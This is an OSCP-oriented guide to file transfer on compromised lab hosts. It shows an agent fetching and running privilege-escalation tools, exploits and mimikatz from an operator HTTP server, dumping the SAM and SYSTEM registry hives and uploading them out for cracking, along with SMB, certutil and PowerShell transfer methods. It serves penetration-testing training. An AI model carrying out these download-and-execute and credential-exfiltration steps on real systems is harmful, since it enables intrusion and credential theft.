# File Transfer Guide - OSCP Scenarios

## Quick Start

### Setup on Operator Machine (Kali)

#### For DOWNLOAD (sending files to target):
```bash
# Navigate to your tools directory
cd ~/tools

# Start simple HTTP server
python3 -m http.server 8080

# Or specific port
python3 -m http.server 80
```

#### For UPLOAD (receiving files from target):
```bash
# Use the custom upload server
python3 upload_server.py 8080

# Or use updog (more features)
pip3 install updog
updog -p 8080
```

---

## Common OSCP Scenarios

### Scenario 1: Windows Enumeration

**Goal:** Upload winPEAS for privilege escalation enumeration

```bash
# Operator (Kali)
cd ~/tools/privilege-escalation/windows
python3 -m http.server 8080

# Agent (Windows target)
> transfer download http://10.10.14.5:8080/winPEASx64.exe C:\Windows\Temp\winpeas.exe
> C:\Windows\Temp\winpeas.exe
```

### Scenario 2: Exploit Transfer

**Goal:** Upload a compiled exploit

```bash
# Operator - Compile exploit
gcc exploit.c -o exploit.exe

# Start HTTP server
python3 -m http.server 8080

# Agent (Windows)
> download http://10.10.14.5:8080/exploit.exe C:\Temp\exploit.exe
> C:\Temp\exploit.exe
```

### Scenario 3: Exfiltrate Sensitive Data

**Goal:** Download SAM/SYSTEM hives

```bash
# Operator - Start upload server
python3 upload_server.py 8080

# Agent (Windows) - Dump SAM
> reg save HKLM\SAM C:\Windows\Temp\sam
> reg save HKLM\SYSTEM C:\Windows\Temp\system

# Upload to operator
> upload C:\Windows\Temp\sam http://10.10.14.5:8080/upload
> upload C:\Windows\Temp\system http://10.10.14.5:8080/upload

# Operator - Crack hashes
samdump2 uploads/*_system uploads/*_sam
```

### Scenario 4: Linux Enumeration

**Goal:** Upload linPEAS

```bash
# Operator
cd ~/tools/privilege-escalation/linux
python3 -m http.server 8080

# Agent (Linux)
> download http://10.10.14.5:8080/linpeas.sh /tmp/linpeas.sh
> chmod +x /tmp/linpeas.sh
> /tmp/linpeas.sh
```

### Scenario 5: Multiple Tools Transfer

**Goal:** Setup a full toolkit on target

```bash
# Operator - Organize tools
mkdir toolkit
cp ~/tools/mimikatz.exe toolkit/
cp ~/tools/procdump.exe toolkit/
cp ~/tools/PowerUp.ps1 toolkit/
cd toolkit
python3 -m http.server 8080

# Agent - Download all
> download http://10.10.14.5:8080/mimikatz.exe C:\Tools\mimikatz.exe
> download http://10.10.14.5:8080/procdump.exe C:\Tools\procdump.exe
> download http://10.10.14.5:8080/PowerUp.ps1 C:\Tools\PowerUp.ps1
```

---

## Troubleshooting

### Error: "Connection refused"

**Cause:** HTTP server not running or firewall blocking

**Solution:**
```bash
# Check if server is running
netstat -tlnp | grep 8080

# Check firewall
sudo ufw allow 8080

# Verify IP address
ip addr show tun0
```

### Error: "File already exists"

**Cause:** Destination file present

**Solution:**
```bash
# Windows
> del C:\Temp\file.exe
> download http://10.10.14.5:8080/file.exe C:\Temp\file.exe

# Linux
> rm /tmp/file.sh
> download http://10.10.14.5:8080/file.sh /tmp/file.sh
```

### Error: "Upload failed: 404"

**Cause:** Wrong endpoint or server doesn't accept uploads

**Solution:**
```bash
# Ensure upload server is running (not simple HTTP server)
python3 upload_server.py 8080

# Use correct endpoint
> upload file.txt http://10.10.14.5:8080/upload
#                                          ^^^^^^^ Important!
```

### Error: "Timeout"

**Cause:** Large file or slow connection

**Solution:**
- Use smaller files
- Compress before transfer
- Check network connectivity
- Try from different network location

---

## Alternative Transfer Methods

### If HTTP doesn't work:

#### SMB (Windows):
```bash
# Operator
sudo impacket-smbserver share . -smb2support

# Target
> net use \\10.10.14.5\share
> copy \\10.10.14.5\share\file.exe C:\Temp\
```

#### Base64 (Small files):
```bash
# Operator
base64 file.exe > file.b64
cat file.b64

# Target (copy paste the base64)
> [paste base64] > C:\Temp\file.b64
> certutil -decode C:\Temp\file.b64 C:\Temp\file.exe
```

#### PowerShell (Windows):
```powershell
# Direct download
Invoke-WebRequest -Uri http://10.10.14.5:8080/file.exe -OutFile C:\Temp\file.exe

# Using agent's transfer command is cleaner
```

---

## Best Practices for OSCP

1. **Always verify file integrity:**
   ```bash
   # Operator - Get hash
   md5sum file.exe
   
   # Target - Verify
   certutil -hashfile C:\Temp\file.exe MD5
   ```

2. **Use temporary directories:**
   - Windows: `C:\Windows\Temp\`, `C:\Users\Public\`
   - Linux: `/tmp/`, `/dev/shm/`

3. **Clean up after yourself:**
   ```bash
   # Delete uploaded tools
   del C:\Windows\Temp\*.exe
   rm /tmp/*.sh
   ```

4. **Document your transfers:**
   - Keep notes of what you uploaded
   - Note file paths for your report
   - Screenshot transfer success

5. **Have backups:**
   - Keep multiple HTTP server ports ready
   - Have alternative transfer methods ready
   - Know SMB/FTP as backup

---

## File Size Recommendations

| File Size | Method | Notes |
|-----------|--------|-------|
| < 1 MB | HTTP transfer | Fast, reliable |
| 1-10 MB | HTTP transfer | May take 10-60s |
| 10-50 MB | HTTP transfer | Consider compression |
| > 50 MB | Compress first | Or use SMB |

---

## Quick Reference

### Download (Target ← Operator):
```
download http://IP:PORT/file destination
```

### Upload (Target → Operator):
```
upload source http://IP:PORT/upload
```

### Operator Commands:
```bash
# Serve files
python3 -m http.server 8080

# Receive files
python3 upload_server.py 8080

# Check uploads
ls -lh uploads/
```

---

## Security Note

⚠️ **All transfers are UNENCRYPTED (plain HTTP)**

- Don't transfer over untrusted networks
- Use only in authorized lab environments
- For production pentests, use HTTPS or VPN tunnels
- OSCP labs are isolated, so HTTP is acceptable